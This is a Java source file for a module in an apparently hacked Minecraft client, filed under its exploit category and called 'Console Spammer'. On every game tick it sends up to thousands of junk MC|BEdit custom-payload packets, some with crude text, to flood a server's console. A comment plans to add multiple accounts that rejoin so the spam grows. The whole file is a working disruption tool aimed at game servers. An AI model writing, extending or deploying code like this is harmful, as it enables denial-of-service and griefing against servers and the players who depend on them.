package lol.nebula.module.exploit;

import lol.nebula.listener.bus.Listener;
import lol.nebula.listener.events.entity.EventUpdate;
import lol.nebula.module.Module;
import lol.nebula.module.ModuleCategory;
import lol.nebula.setting.Setting;
import lol.nebula.util.feature.DevelopmentFeature;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.nio.charset.StandardCharsets;

/**
 * @author aesthetical
 * @since 05/27/23
 */
@DevelopmentFeature
public class ConsoleSpammer extends Module {
    private final Setting<Integer> packets = new Setting<>(200, 1, 5000, "Packets");

    public ConsoleSpammer() {
        super("Console Spammer", "Spams the console and shit", ModuleCategory.EXPLOIT);
    }

    @Listener
    public void onUpdate(EventUpdate event) {
        for (int i = 0; i < packets.getValue(); ++i) {

            // TODO: use multiple accs to join and rejoin to spam this
            mc.thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload(
                    "MC|BEdit",
                    ("lickmyhairyballs" + Math.random()).getBytes(StandardCharsets.UTF_8)));

        }
    }
}
